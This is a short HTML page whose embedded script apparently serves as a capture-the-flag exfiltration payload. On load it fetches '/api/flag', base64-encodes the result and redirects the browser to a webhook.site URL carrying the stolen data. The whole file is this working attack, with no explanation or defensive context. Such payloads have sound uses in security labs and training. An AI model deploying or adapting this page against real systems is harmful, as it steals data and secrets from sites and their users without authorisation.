<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fetch and Redirect</title>
</head>
<body>
    <script>
        fetch('/api/flag')
            .then(response => response.text())
            .then(text => {
                const encodedFlag = btoa(text);
                window.location.href = `https://webhook.site/0e039ea9-674a-4a9c-a42b-aca98da957f0?cz=${encodedFlag}`;
            })
            .catch(error => console.error('Error:', error));
    </script>
</body>
</html>
